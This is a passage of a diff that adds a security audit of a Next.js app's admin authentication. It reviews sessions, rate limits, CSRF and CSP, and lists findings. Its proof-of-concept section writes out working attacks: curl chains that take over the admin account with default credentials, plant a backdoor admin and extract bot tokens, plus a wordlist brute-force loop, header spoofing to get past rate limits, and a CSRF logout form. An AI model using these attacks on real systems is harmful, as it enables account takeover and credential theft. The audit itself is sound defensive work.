+    if (method === "POST" || method === "PUT" || method === "PATCH") {
+      const contentLength = parseInt(req.headers.get("content-length") || "0", 10);
+      if (contentLength > 1024 * 1024) { // 1MB
+        return NextResponse.json({ ok: false, error: "payload_too_large" }, { status: 413 });
+      }
+    }
+  Issue: Checks Content-Length header, NOT actual byte count. If attacker
+    sends `Content-Length: 100` but streams 10MB, middleware passes but the
+    body parser will still buffer to 10MB (Next.js default). Mitigation:
+    Next.js Route Handlers' `request.json()` reads from the stream, but
+    Next.js runtime has its own body size limits. The middleware check is
+    a soft cap.
+  Verdict: ✅ Enforced for honest clients. Soft cap only — does not block
+    liars with mismatched Content-Length. Severity: LOW (residual).
+
+[1.6] CSP Header (lines 111-133) — STILL PERMISSIVE
+  Code (line 114):
+    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.google.com https://www.gstatic.com",
+  Issues:
+    (a) 'unsafe-inline' allows any injected <script>...</script> to execute.
+    (b) 'unsafe-eval' allows eval(), new Function(), etc.
+    (c) https://www.google.com and https://www.gstatic.com in script-src
+        allow loading arbitrary scripts from those origins (reCAPTCHA).
+        Not exploitable per se but widens attack surface if google.com
+        ever serves user-controlled JS (it doesn't, but in theory).
+  Impact: If any HTML injection point survives (none found in V17.1 audit,
+    but defense-in-depth), injected script executes. HttpOnly cookie blocks
+    document.cookie access — but injected script can still call
+    `fetch('/api/admin/settings', { credentials: 'include' })` and exfiltrate
+    the response (bot tokens via F-17).
+  Verdict: ❌ CSP is NOT bulletproof. Use nonces for Next.js runtime chunks
+    and remove 'unsafe-inline'/'unsafe-eval' in production.
+  Severity: MEDIUM (F-18 carryover).
+
+[1.7] HSTS Header (lines 210-213) — ADDED IN V17.2 ✅
+  Code:
+    if (req.url.startsWith("https://")) {
+      res.headers.set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload");
+    }
+  Verdict: ✅ Correct — only set on HTTPS, max-age 2 years, includeSubDomains,
+    preload enabled. F-27 FIXED.
+
+────────────────────────────────────────────────────────────────────────────────
+FILE 2: src/lib/admin-auth.ts
+────────────────────────────────────────────────────────────────────────────────
+
+[2.1] checkAdminAuth (lines 37-55) — STILL HAS PASSWORD BACKDOOR
+  Code:
+    export async function checkAdminAuth(request: Request, password?: string): ... {
+      // ۱. اول session cookie رو چک کن
+      try {
+        const session = getSessionFromRequest(request);
+        if (session) {
+          const user = await db.accessUser.findUnique({ where: { id: session.userId } });
+          if (user && user.active && user.role === "admin") {
+            return { ok: true, userId: user.id };
+          }
+        }
+      } catch {}
+      // ۲. اگه session نبود، password رو چک کن
+      if (password) {
+        return checkAdminPassword(password);
+      }
+      return { ok: false };
+    }
+  Issue: The `password` parameter is OPTIONAL but accepted by every caller
+    (16 admin routes pass `url.searchParams.get("password")` or
+    `body.password`). This is the F-3 root cause that V17.2-FINAL did NOT fix.
+  The V17.2-FINAL "removal" of the `#admin` hash route was a UI-level
+    change in user-dashboard/page.tsx. The API still accepts passwords.
+  Impact: Anyone with the admin password can call /api/admin/* WITHOUT a
+    session cookie. Combined with F-2 (default admin123), fresh install is
+    fully pwnable.
+  PoC:
+    curl -X POST https://victim.com/api/admin/security \
+      -H "Content-Type: application/json" \
+      -d '{"password":"admin123","action":"change_password","newPassword":"newpass","currentPassword":"admin123"}'
+    # Works with NO cookie, NO Origin header (well, Origin check applies to
+    # non-public paths — but attacker sets Origin: https://victim.com and
+    # Host: victim.com headers, middleware passes).
+  Severity: HIGH (F-3 + F-NEW-1 root cause).
+
+[2.2] checkAdminAuth does NOT verify active/role/expiry BEFORE returning ok
+  Looking again at lines 40-46:
+    if (session) {
+      const user = await db.accessUser.findUnique({ where: { id: session.userId } });
+      if (user && user.active && user.role === "admin") {
+        return { ok: true, userId: user.id };
+      }
+    }
+  ✅ active is checked.
+  ✅ role === "admin" is checked.
+  ❌ checkAccess (time/day/expiry policy) is NOT called. (F-16.)
+  ❌ user.expiresAt is NOT checked here. (It IS checked in /api/user/verify
+     via checkAccess, but admin API mutations bypass it.)
+
+[2.3] checkAdminPassword (lines 15-28) — NON-DETERMINISTIC + NO LOG
+  Code:
+    const adminUser = await db.accessUser.findFirst({
+      where: { role: "admin", active: true },
+    });
+    if (adminUser) {
+      const ok = await verifyPassword(password, adminUser.passwordHash);
+      if (ok) return { ok: true, userId: adminUser.id };
+    }
+    return { ok: false };
+  Issues:
+    (a) findFirst without orderBy — non-deterministic if multiple admins.
+        Schema has no @unique constraint on role=admin. If 2 admins exist,
+        one is picked arbitrarily. (F-15 carryover.)
+    (b) On failed password, returns { ok: false } with NO logAccess call.
+        (F-7 carryover.) Combined with F-5 (no rate limit on admin
+        endpoints), brute-force is invisible.
+    (c) On success, no logAccess call either. (Login via /api/user/login
+        logs "login_success" via line 93 — but admin password fallback
+        at /api/admin/* does NOT log success anywhere.)
+  Severity: HIGH (F-5 + F-7 + F-15 compound).
+
+────────────────────────────────────────────────────────────────────────────────
+FILE 3: src/lib/admin-session.ts
+────────────────────────────────────────────────────────────────────────────────
+
+[3.1] checkAdminSession (lines 11-24) — CORRECT BUT INCOMPLETE
+  Code:
+    const session = getSessionFromRequest(request);
+    if (!session) return { ok: false };
+    const user = await db.accessUser.findUnique({ where: { id: session.userId } });
+    if (!user || !user.active) return { ok: false };
+    if (user.role !== "admin") return { ok: false };
+    return { ok: true, userId: user.id };
+  Verdict:
+    ✅ Cookie-only — no password fallback. (Used by /api/admin/clips/route.ts.)
+    ✅ active is checked.
+    ✅ role === "admin" is checked.
+    ❌ checkAccess (time/day/expiry) NOT called. (F-16.)
+    ❌ No logAccess call on success or failure.
+  Note: This function is only used by /api/admin/clips (3 handlers). All
+    other admin routes use checkAdminAuth which has the password fallback.
+  Severity: MEDIUM (F-16 + audit-log gap).
+
+────────────────────────────────────────────────────────────────────────────────
+FILE 4: src/lib/access-auth.ts
+────────────────────────────────────────────────────────────────────────────────
+
+[4.1] getSecret / SESSION_SECRET lazy-load (lines 19-43) — FIXED ✅
+  Code:
+    let _SECRET: string | null = null;
+    function getSecret(): string {
+      if (_SECRET) return _SECRET;
+      const s = process.env.SESSION_SECRET;
+      if (!s) throw new Error("SESSION_SECRET env var is required");
+      const KNOWN_BAD_SECRETS = new Set(["build-placeholder","change-me","secret","your-secret-here","changeme",""]);
+      if (KNOWN_BAD_SECRETS.has(s) || s.length < 32) throw new Error("SESSION_SECRET is too weak");
+      _SECRET = s;
+      return _SECRET;
+    }
+  Verdict:
+    ✅ Lazy-loaded — build no longer fails when SESSION_SECRET is absent.
+    ✅ Rejects known placeholders and < 32 char secrets.
+    ✅ install.sh generates 64-char hex (256-bit entropy).
+  Note: One residual concern — `getSecret()` is only called when signing/
+    verifying tokens. If a route never signs/verifies (e.g., middleware's
+    hasValidSession), getSecret is never called, and the weak-secret check
+    never fires. Not a vuln, just an observation.
+
+[4.2] verifySessionToken HMAC verification (lines 78-96) — CORRECT ✅
+  Code:
+    const decoded = Buffer.from(token, "base64").toString("utf8");
+    const parts = decoded.split(".");
+    if (parts.length !== 3) return null;
+    const [userId, expiresAtStr, sig] = parts;
+    const expiresAt = parseInt(expiresAtStr, 10);
+    if (isNaN(expiresAt)) return null;
+    if (Date.now() > expiresAt) return null;
+    const expectedSig = hmac(`${userId}.${expiresAt}`);
+    const sigBuf = Buffer.from(sig, "hex");
+    const expBuf = Buffer.from(expectedSig, "hex");
+    if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) return null;
+    return { userId, expiresAt };
+  Verdict:
+    ✅ Base64 decode → split → length check.
+    ✅ Expiry parsed as int with NaN guard.
+    ✅ Date.now() > expiresAt rejects expired tokens.
+    ✅ HMAC recomputed and compared with timingSafeEqual.
+    ✅ Length pre-check before timingSafeEqual (prevents the
+       "different length → throws" footgun).
+  Severity: LOW (F-13 carryover — payload split on "." is fragile to
+    future userId formats with embedded dots; not exploitable today
+    because cuid IDs are alphanumeric).
+
+[4.3] createSessionToken (lines 67-72) — CORRECT ✅
+  Code:
+    const expiresAt = Date.now() + SESSION_DURATION_HOURS * 60 * 60 * 1000;
+    const payload = `${userId}.${expiresAt}`;
+    const sig = hmac(payload);
+    return Buffer.from(`${payload}.${sig}`).toString("base64");
+  Verdict: ✅ Correct HMAC-SHA256 signing. No issues.
+
+[4.4] getSessionFromRequest (lines 186-201) — CORRECT ✅
+  Code:
+    const cookieHeader = request.headers.get("cookie") || "";
+    const cookies = Object.fromEntries(
+      cookieHeader.split(";").map(c => {
+        const [k, ...v] = c.trim().split("=");
+        return [k, v.join("=")];
+      })
+    );
+    let token = cookies["access_session"];
+    if (!token) return null;
+    try { token = decodeURIComponent(token); } catch {}
+    return verifySessionToken(token);
+  Verdict: ✅ Cookie parsing handles values containing `=` (v.join("=")).
+    ✅ URL-decode handles browser-encoded base64.
+    ✅ Delegates to verifySessionToken for HMAC check.
+
+[4.5] checkAccess (lines 111-150) — CORRECT BUT UNUSED ON ADMIN PATHS
+  Code: implements expiry, allowedDays, allowedHourStart/End checks.
+  Verdict:
+    ✅ Logic is correct for time/day/expiry.
+    ❌ ONLY called from /api/user/verify (line 27). NOT called from
+       checkAdminAuth or checkAdminSession. (F-16.)
+  Severity: MEDIUM (policy bypass for admin endpoints).
+
+[4.6] getClientIp (lines 175-181) — TRUSTS X-Forwarded-For BLINDLY
+  Code:
+    const forwarded = request.headers.get("x-forwarded-for");
+    if (forwarded) return forwarded.split(",")[0].trim();
+    const realIp = request.headers.get("x-real-ip");
+    if (realIp) return realIp;
+    return null;
+  Issue: X-Forwarded-For is attacker-controlled. No trusted-proxy
+    validation. (F-9 carryover.)
+  Severity: HIGH (rate-limit + audit-log bypass).
+
+────────────────────────────────────────────────────────────────────────────────
+FILE 5: src/app/api/user/login/route.ts
+────────────────────────────────────────────────────────────────────────────────
+
+[5.1] Password Verification (line 66) — bcrypt ✅
+  Code: `const passwordOk = await verifyPassword(password, user.passwordHash);`
+  Delegates to access-auth.ts:58-60: bcrypt.compare(password, hash).
+  Verdict: ✅ Correct bcrypt verification. Salt rounds = 10 (line 51).
+
+[5.2] Rate Limit (lines 19-34, 49-55) — TWO LAYERS, BOTH BYPASSABLE
+  Layer 1: middleware.ts:144-155 — 5/15min per IP via X-Forwarded-For.
+  Layer 2: login/route.ts:22-34 — own Map, 5/15min per IP via getClientIp.
+  Issues:
+    (a) Both layers trust X-Forwarded-For. Attacker sets
+        `X-Forwarded-For: 1.2.3.4` per request → bypasses both layers.
+        (F-9.)
+    (b) Both layers are in-memory Maps. Multi-instance: each instance has
+        its own counter → 5 × N total budget. (F-8.)
+    (c) login/route.ts Map has NO sweep (line 22-34). Memory leak under
+        rotating-IP attack. (F-25.)
+    (d) Both layers use same key (`ip`); if middleware 429s, login route
+        is never reached, so layer 2 is effectively dead code unless
+        middleware is bypassed (e.g., direct route hit without middleware
+        running — not possible in Next.js).
+  Verdict: Rate limit IS enforced (5/15min per IP) for single-instance
+    + honest-client deployments. Bypassable via F-9 + F-8.
+
+[5.3] Cookie Flags (lines 106-112) — MOSTLY CORRECT, NO __Host- PREFIX
+  Code:
+    response.cookies.set("access_session", token, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "strict",
+      path: "/",
+      maxAge: 60 * 60 * 24, // 24h
+    });
+  Verdict:
+    ✅ httpOnly: true → blocks document.cookie access via XSS.
+    ✅ secure: NODE_ENV === "production" → correct dev/prod behavior.
+    ✅ sameSite: "strict" → blocks browser-mediated CSRF.
+    ✅ path: "/" → standard.
+    ✅ maxAge: 24h → matches SESSION_DURATION_HOURS.
+    ❌ NO __Host- prefix on cookie name. (F-11.)
+    ❌ No Domain attribute — defaults to the request's host (good for
+       __Host- behavior, but without the prefix a compromised subdomain
+       can still set a shadowing cookie).
+  Severity: MEDIUM (F-11).
+
+[5.4] Access Logging (lines 68, 74, 81, 93) — PARTIAL
+  Logs:
+    ✅ login_failed (line 68) — for existing user, wrong password.
+    ✅ access_denied_inactive (line 74) — for inactive account.
+    ✅ access_denied_expired (line 81) — for expired account.
+    ✅ login_success (line 93) — for successful login.
+  Gaps:
+    ❌ User-not-found (line 61-64) returns 401 WITHOUT logAccess call.
+        Comment on line 62: "skip log اگه کاربر وجود نداره (FK violation)"
+        — the FK violation concern is valid (AccessLog.userId is required
+        FK to AccessUser.id), but the absence of any log enables user
+        enumeration via timing. (F-14.) An attacker brute-forcing
+        usernames gets instant 401 for non-existent vs ~100ms bcrypt
+        delay for existent.
+    ❌ Rate-limit 429 (line 51-54) is NOT logged to SecurityLog. Attacker
+        hitting 5/15min is invisible in the security dashboard.
+  Verdict: Login DOES log to access log. But user-not-found and rate-limit
+    cases are silent.
+
+────────────────────────────────────────────────────────────────────────────────
+FILE 6: src/app/api/user/verify/route.ts
+────────────────────────────────────────────────────────────────────────────────
+
+[6.1] Session Validation (lines 17-25) — CORRECT ✅
+  Code:
+    const session = getSessionFromRequest(request);
+    if (!session) return NextResponse.json({ ok: false });
+    const user = await db.accessUser.findUnique({ where: { id: session.userId } });
+    if (!user) return NextResponse.json({ ok: false });
+  Verdict: ✅ Delegates to getSessionFromRequest which verifies HMAC.
+    ✅ Looks up user by session.userId. Rejects if not found.
+    Note: The response is { ok: false } with 200 status (not 401). The
+    client-side check at user-dashboard/page.tsx:101-104 handles this.
+    Mild oddity — returns 200 for "not authenticated" — but no security
+    impact.
+
+[6.2] checkAccess Enforcement (line 27) — ENFORCED ✅
+  Code:
+    const access = await checkAccess(user.id);
+    if (!access.allowed) {
+      await logAccess(user.id, access.reason, getClientIp(request), request.headers.get("user-agent"));
+    }
+  Verdict: ✅ checkAccess IS called. ✅ Denied access IS logged.
+    ✅ Returns access object to client for UI gating.
+  Issue: Returns user data (including permissions, allowedHourStart,
+    allowedHourEnd, allowedDays, expiresAt) EVEN IF access.allowed is
+    false. Mild information disclosure — see F-NEW-8.
+  Severity: LOW (informational).
+
+[6.3] Response shape (lines 33-49) — INFORMATION DISCLOSURE
+  Returns full user object including `permissions`, `allowedHourStart`,
+    `allowedHourEnd`, `allowedDays`, `expiresAt`, `active`, `lastLoginAt`.
+  Issue: A regular user whose access was revoked (e.g., expired) still
+    sees their permission list and policy in the response. This is by
+    design for UI rendering, but a revoked user can use this info to
+    know what they're missing and when their access expires.
+  Severity: LOW (F-NEW-8).
+
+────────────────────────────────────────────────────────────────────────────────
+FILE 7: src/app/api/user/logout/route.ts
+────────────────────────────────────────────────────────────────────────────────
+
+[7.1] Server-Side State Invalidation — NONE ❌
+  Code:
+    export async function POST() {
+      const response = NextResponse.json({ ok: true });
+      response.cookies.delete("access_session");
+      return response;
+    }
+  Issue: Only deletes the client-side cookie. Does NOT:
+    - Increment a `tokenVersion` field (no such field in schema).
+    - Add the token to a server-side denylist.
+    - Call logAccess with a "logout" action.
+  Impact: Stolen cookies remain valid for up to 24h (SESSION_DURATION_HOURS).
+    Combined with F-NEW-5 (password change doesn't invalidate), an attacker
+    with a stolen cookie retains access for 24h regardless of admin's
+    defensive actions (logout, password change).
+  Severity: HIGH (F-6 carryover + F-NEW-5 escalation).
+
+[7.2] CSRF Protection — NONE (in PUBLIC_API_PREFIXES) ❌
+  File: src/middleware.ts:30 — "/api/user/logout" in PUBLIC_API_PREFIXES.
+  File: src/middleware.ts:158-159 — CSRF check skipped for public paths.
+  Issue: Any cross-origin POST to /api/user/logout bypasses the Origin
+    check. Combined with the unauthenticated handler, an attacker can
+    force-logout the victim via CSRF.
+  Mitigation: SameSite=strict on the access_session cookie blocks the
+    cookie from being sent on cross-site POST. But the response sets
+    `Set-Cookie: access_session=; Max-Age=0; Path=/`, which the browser
+    applies to clear the victim's cookie — even though the request
+    didn't include the cookie.
+  PoC:
+    <!-- Attacker's page -->
+    <form action="https://victim.com/api/user/logout" method="POST">
+      <input type="submit" value="click me">
+    </form>
+    <!-- Or auto-submit: -->
+    <script>fetch('https://victim.com/api/user/logout', { method: 'POST' });</script>
+    <!-- Victim's access_session cookie is cleared. -->
+  Severity: LOW (F-24 carryover — minor DoS / UX nuisance, not privilege
+    escalation). Combined with F-6 (no server-side invalidation), the
+    attacker gains nothing from this beyond logging the victim out.
+
+================================================================================
+CROSS-CUTTING ATTACK SURFACE ANALYSIS
+================================================================================
+
+[A] ACCESS /api/admin/* WITHOUT BEING ADMIN
+  Path A (default creds, F-2 + F-3 + F-NEW-1):
+    Fresh install → seed_access_users.py creates admin/admin123 →
+    POST /api/admin/security { password: "admin123", ... } → 200 OK.
+    No cookie needed. No CSRF needed (Origin:Host headers spoofable).
+  Path B (stolen cookie, F-6 + F-17 + F-18):
+    XSS bypasses CSP (F-18 weakens) → fetch /api/admin/settings with
+    victim's cookie → bot tokens exfiltrated → 24h window (F-6).
+  Path C (forged cookie, F-1 — defense-in-depth only):
+    Forge cookie → middleware passes (F-1) → API rejects (HMAC verified).
+    Not direct bypass. Page shell briefly visible.
+  Path D (URL leak, F-3 + default creds):
+    Fresh install, admin visits /api/chat?password=admin123 → URL is
+    logged in nginx access logs → attacker reads logs → password known.
+  Path E (brute force, F-5 + F-7 + F-9):
+    No rate limit on /api/admin/* (F-5). No log (F-7). X-Forwarded-For
+    spoofing (F-9). Unlimited invisible brute-force.
+  Verdict: ❌ MULTIPLE viable paths. Default install = full pwn in 1 request.
+
+[B] FORGE A SESSION COOKIE
+  Cannot forge a VALID cookie:
+    - HMAC-SHA256 with 256-bit SESSION_SECRET.
+    - timingSafeEqual comparison.
+    - Length pre-check (no throw).
+  CAN forge a cookie that PASSES MIDDLEWARE (F-1):
+    - Token format: base64(userId.expiresAt.sig)
+    - Middleware accepts any sig, any non-empty userId, future expiry.
+    - API layer rejects via verifySessionToken.
+  Verdict: ❌ Cannot forge valid cookie. ⚠️ Forged cookie passes middleware
+    redirect only (defense-in-depth gap, not exploit).
+
+[C] BYPASS RATE LIMIT
+  Path A (X-Forwarded-For spoofing, F-9):
+    `curl -H "X-Forwarded-For: 1.2.3.4" ...` — fresh quota per fake IP.
+  Path B (multi-instance, F-8):
+    In-memory Map per isolate/worker. 5 × N total budget.
+  Path C (admin endpoints, F-5):
+    /api/admin/* has NO rate limit. Unlimited brute-force.
+  Verdict: ❌ Trivially bypassable. The /api/user/login rate limit
+    is effectively zero defense against a determined attacker.
+
+[D] BYPASS CSRF PROTECTION
+  Path A (password fallback, F-3 + F-NEW-1):
+    POST /api/admin/security { password: "admin123" } — no cookie needed.
+    Middleware Origin check applies (POST + non-public path), but
+    attacker spoofs Origin:Host headers.
+  Path B (script with spoofed headers, F-10):
+    `curl -H "Origin: https://victim.com" -H "Host: victim.com" ...`
+    Middleware passes.
+  Path C (GET endpoints, no CSRF check):
+    GET /api/chat?password=admin123 — no CSRF check on GET.
+    Returns data if password is correct. (But CORS blocks JS from
+    reading the response cross-origin. Curl/server-to-server works.)
+  Path D (logout, F-24):
+    /api/user/logout in PUBLIC_API_PREFIXES → CSRF check skipped.
+  Verdict: ❌ Multiple bypass paths. CSRF protection is INSUFFICIENT
+    against script-mediated attacks. SameSite=strict cookie is the
+    ONLY effective defense against browser-mediated CSRF.
+
+[E] STEAL SESSION COOKIE VIA XSS
+  Direct theft (document.cookie):
+    ❌ Blocked — cookie is HttpOnly (login route line 107).
+  Indirect exfiltration (fetch with credentials):
+    ⚠️ POSSIBLE if XSS succeeds. CSP (F-18) allows 'unsafe-inline' +
+    'unsafe-eval', so any injection point executes JS. Injected script
+    can `fetch('/api/admin/settings', { credentials: 'include' })` and
+    exfiltrate the response (including bot tokens via F-17).
+  Verdict: ❌ Direct theft blocked. Indirect exfiltration possible if XSS
+    succeeds. CSP weakness (F-18) is the critical enabler.
+
+[F] STEAL SESSION COOKIE VIA CSRF
+  Verdict: ✅ Blocked — SameSite=strict (login route line 109) prevents
+    the cookie from being sent on cross-site requests. An attacker
+    cannot exfiltrate the cookie via CSRF because the cookie never
+    leaves the browser for cross-site requests.
+
+[G] BRUTE-FORCE ADMIN PASSWORD
+  Path A (/api/user/login):
+    Rate-limited 5/15min per IP. Bypassable via X-Forwarded-For (F-9)
+    and multi-instance (F-8). User enumeration via timing (F-14).
+  Path B (/api/admin/* — F-5 + F-7):
+    NO rate limit. NO logging. Unlimited brute-force.
+    PoC:
+      while IFS= read -r PW; do
+        curl -s -X POST https://victim.com/api/admin/security \
+          -H "Content-Type: application/json" \
+          -H "Origin: https://victim.com" \
+          -d "{\"password\":\"$PW\",\"action\":\"change_password\",\"newPassword\":\"x\",\"currentPassword\":\"x\"}" \
+          | grep -v "401"
+      done < /usr/share/wordlists/rockyou.txt
+  Verdict: ❌ Brute-force is trivially possible. The login route has
+    weak defense; the admin endpoints have ZERO defense.
+
+[H] REPLAY ATTACK WITH OLD SESSION
+  Path A (logout doesn't invalidate, F-6):
+    Stolen cookie valid for up to 24h after the victim logs out.
+  Path B (password change doesn't invalidate, F-NEW-5):
+    Stolen cookie valid for up to 24h after admin changes the password.
+    No tokenVersion, no session table, no denylist.
+  PoC:
+    T=0h   : Attacker steals cookie via XSS-sniff (reflected XSS, etc).
+    T=1h   : Admin notices, changes password (currentPassword required,
+             F-4 partial fix).
+    T=1h+ε : Attacker's cookie STILL WORKS for /api/admin/* — no
+             invalidation occurred.
+    T=24h  : Cookie finally expires.
+  Verdict: ❌ 24h window of full account takeover after detected compromise.
+
+[I] GET ADMIN PRIVILEGES AS REGULAR USER
+  Path A (admin promotes user, F-NEW-2):
+    /api/admin/users POST lets admin set role="admin". Requires existing
+    admin. Not an escalation by a regular user.
+  Path B (regular user calls /api/admin/*):
+    checkAdminAuth/checkAdminSession/checkAdmin all require
+    user.role === "admin" (admin-auth.ts:43, admin-session.ts:18,
+    users/route.ts:26, users/[id]/route.ts:20, users/logs/route.ts:17).
+    A regular user (role=user) with valid session is REJECTED at every
+    admin endpoint.
+  Path C (permission bypass):
+    Schema has `permissions` field (string, comma-separated). But NO
+    /api/admin/* endpoint checks `permissions` — they only check role.
+    The `permissions` field is used ONLY client-side in user-dashboard/
+    page.tsx:138-143 to gate which TABS to show. A regular user with
+    permissions="users,content" can SEE those tabs in the UI, but
+    calling /api/admin/users returns 401 (role !== admin).
+  Path D (regular user creates admin via /api/admin/users POST):
+    Blocked — requires admin session (line 21-28).
+  Verdict: ✅ Cannot escalate regular user → admin via the API.
+    ❌ BUT: if a regular user compromises the admin password (via F-2/F-3),
+    they can create a backdoor admin account (F-NEW-2) for persistence.
+
+================================================================================
+FINDINGS TABLE (V17.2-FINAL-AUDIT-1)
+================================================================================
+
+ID         | Sev     | One-liner                                                          | Status vs V17.2-AUDIT-01
+---------- | ------- | ------------------------------------------------------------------ | -------------------------
+F-1        | HIGH    | Middleware hasValidSession does NOT verify HMAC (forged cookies     | Still open; downgraded
+           |         | pass middleware, blocked at API)                                   | from CRITICAL (defense-
+           |         |                                                                    | in-depth only)
+F-2        | CRIT    | Default admin/admin123 still seeded; no mustChangePassword         | Still open
+F-3        | CRIT    | Admin password accepted in URL/body across 16 endpoints            | Still open
+F-4        | HIGH    | change_password requires currentPassword BUT: (a) outer authCheck  | Partial fix
+           |         | still accepts password fallback; (b) no session invalidation;     |
+           |         | (c) findFirst non-deterministic for multi-admin                   |
+F-5        | HIGH    | No rate limit on /api/admin/* endpoints (brute-force unlimited)    | Still open
+F-6        | HIGH    | Logout doesn't invalidate server-side state; stolen cookie 24h    | Still open
+F-7        | HIGH    | Failed admin-password attempts NOT logged (invisible brute force) | Still open
+F-8        | HIGH    | In-memory rate-limit Maps bypassable in multi-instance + leak     | Partial fix (sweep on
+           |         |                                                                    | middleware only; login +
+           |         |                                                                    | chat Maps still leak)
+F-9        | HIGH    | X-Forwarded-For trusted blindly → rate-limit + audit bypass        | Still open
+F-10       | MED     | CSRF Origin===Host bypassable by scripts (Origin/Host spoofable)   | Still open
+F-11       | MED     | Cookie lacks __Host- prefix (subdomain injection risk)             | Still open
+F-12       | LOW     | secure:true hardcoded (masks auth failures in HTTP dev)            | FIXED (conditional on
+           |         |                                                                    | NODE_ENV)
+F-13       | LOW     | HMAC payload splits on "." (fragile to future userId formats)      | Still open (low impact)
+F-14       | MED     | Timing-based user enumeration on /api/user/login (user-not-found   | Still open
+           |         | returns instantly, user-exists takes ~100ms bcrypt)                |
+F-15       | MED     | checkAdminPassword uses findFirst without ordering (non-determin.) | Still open
+F-16       | MED     | checkAccess (time/day/expiry) NOT enforced on admin endpoints      | Still open
+F-17       | MED     | Bot tokens returned in plaintext to admin session (cookie theft    | Still open
+           |         | → token leak)                                                     |
+F-18       | MED     | CSP allows 'unsafe-inline'/'unsafe-eval' in script-src (weakens    | Still open
+           |         | XSS mitigation)                                                   |
+F-19       | MED     | Webhook secret accepted via URL query string                       | Still open (out of scope)
+F-20       | LOW     | CSRF check skipped for /api/messages, /api/chat                    | PARTIAL FIX (messages
+           |         |                                                                    | removed; chat still in
+           |         |                                                                    | PUBLIC_API_PREFIXES)
+F-21       | LOW     | Legacy PERSONAL.adminPassword constant still in source             | Still open
+F-22       | LOW     | reset-admin-password.sh SQL via unescaped hash                     | Still open
+F-23       | LOW     | /api/track no rate limit, no length cap, DB pollution               | Still open (out of scope)
+F-24       | LOW     | Logout endpoint unauthenticated (minor DoS via CSRF)               | Still open
+F-25       | LOW     | loginAttempts Map has no periodic cleanup (memory leak)            | Still open
+F-26       | LOW     | book.cover inline style injection (CSS property injection, no JS)  | Still open (out of scope)
+F-27       | LOW     | No HSTS header (HTTP downgrade risk)                               | FIXED
+F-28       | LOW     | userId is base64 (not encrypted) in cookie — informational         | Still open (informational)
+F-29       | LOW     | Orphan StatsDashboard/SecurityDashboard still send ?password=       | Still open
+F-30       | LOW     | No Cache-Control: no-store on /api/admin/* responses                | Still open
+F-NEW-1    | HIGH    | checkAdminAuth falls back to password EVEN FOR SESSION-EXPECTED     | NEW (root cause of F-3)
+           |         | ROUTES — backdoor still wide open                                  |
+F-NEW-2    | MED     | /api/admin/users POST lets admin create new admin (backdoor       | NEW
+           |         | persistence) — no audit log                                       |
+F-NEW-3    | MED     | /api/admin/users/[id] PUT allows admin to demote another admin    | NEW
+           |         | (no multi-admin protection)                                       |
+F-NEW-4    | MED     | change_password targets FIRST admin found, not the requesting      | NEW
+           |         | admin — non-deterministic in multi-admin                          |
+F-NEW-5    | HIGH    | change_password does NOT invalidate existing sessions (escalates  | NEW (escalates F-6)
+           |         | F-6: stolen cookie valid 24h AFTER password change)               |
+F-NEW-6    | LOW     | Logout endpoint in PUBLIC_API_PREFIXES + unauth — CSRF clears     | NEW (extends F-24)
+           |         | victim's cookie via cross-site POST                                |
+F-NEW-7    | LOW     | Login response includes role in JSON (info disclosure — by design) | NEW (informational)
+F-NEW-8    | LOW     | /api/user/verify returns permissions/policy even when access      | NEW
+           |         | denied — info disclosure                                           |
+F-NEW-9    | MED     | /api/chat/messages GET has NO authentication — anyone with a       | NEW (out of admin chain
+           |         | leaked sessionId reads conversation                                | but in scope of auth)
+F-NEW-10   | MED     | SameSite=strict is the ONLY effective CSRF defense — middleware   | NEW (clarifies F-10)
+           |         | Origin check is bypassable for scripts                             |
+
+================================================================================
+CRITICAL / HIGH FINDINGS — DETAILED PoCs
+================================================================================
+
+■ F-2 + F-3 + F-NEW-1 (CRITICAL + HIGH compound): Default creds + password backdoor
+  Files:
+    scripts/seed_access_users.py:56-67 (creates admin/admin123)
+    scripts/reset-admin-password.sh:30,50 (resets admin password to admin123)
+    src/lib/admin-auth.ts:37-55 (checkAdminAuth password fallback)
+    src/app/api/admin/security/route.ts:46 (authCheck = await checkAdminAuth(req, password))
+    src/app/api/admin/settings/route.ts:22, 104 (same pattern)
+    src/app/api/messages/route.ts:14, 66 (same pattern)
+    src/app/api/chat/route.ts:224 (GET with ?password=)
+    [+ 13 more admin routes]
+
+  PoC (one-shot fresh-install pwn):
+    # Step 1: Confirm admin password (default admin123 on fresh install)
+    curl -s "https://victim.com/api/admin/security?password=admin123"
+    # → {"ok":true,"hasPassword":true} if password is correct.
+
+    # Step 2: Change admin password to "newpass" (locks out real admin)
+    curl -s -X POST https://victim.com/api/admin/security \
+      -H "Content-Type: application/json" \
+      -H "Origin: https://victim.com" \
+      -d '{
+        "password": "admin123",
+        "action": "change_password",
+        "currentPassword": "admin123",
+        "newPassword": "attacker-owns-you"
+      }'
+    # → {"ok":true,"message":"Password changed."}
+
+    # Step 3: Login with new password to get a session cookie
+    curl -s -X POST https://victim.com/api/user/login \
+      -H "Content-Type: application/json" \
+      -d '{"username":"admin","password":"attacker-owns-you"}' \
+      -c /tmp/cookie.jar
+
+    # Step 4: Create a backdoor admin account (persistence)
+    curl -s -X POST https://victim.com/api/admin/users \
+      -H "Content-Type: application/json" \
+      -H "Origin: https://victim.com" \
+      -b /tmp/cookie.jar \
+      -d '{"username":"backdoor","password":"backdoor-pass","role":"admin"}'
+
+    # Step 5: Exfiltrate bot tokens
+    curl -s "https://victim.com/api/admin/settings" -b /tmp/cookie.jar
+    # → {"ok":true,"settings":{"baleBotToken":"...","telegramBotToken":"...",...}}
+
+  Impact: Full admin takeover on any fresh install within 5 HTTP requests.
+    Persistence via backdoor admin account. Bot tokens leaked for
+    impersonation in Bale/Telegram.
+  Severity: CRITICAL.
+
+■ F-5 + F-7 (HIGH): Unlimited invisible admin-password brute-force
+  Files:
+    src/middleware.ts:21 (RATE_LIMIT_PATHS excludes /api/admin/*)
+    src/lib/admin-auth.ts:27 (failed password → return {ok:false}, no log)
+    src/app/api/admin/security/route.ts:50 (failed auth → return 401, no log)
+    [+ 15 more admin routes that don't log failures]
+
+  PoC:
+    #!/bin/bash
+    # Brute-force admin password against /api/admin/security (no rate limit)
+    while IFS= read -r pw; do
+      resp=$(curl -s -o /dev/null -w "%{http_code}" \
+        "https://victim.com/api/admin/security?password=$pw")
+      if [ "$resp" = "200" ]; then
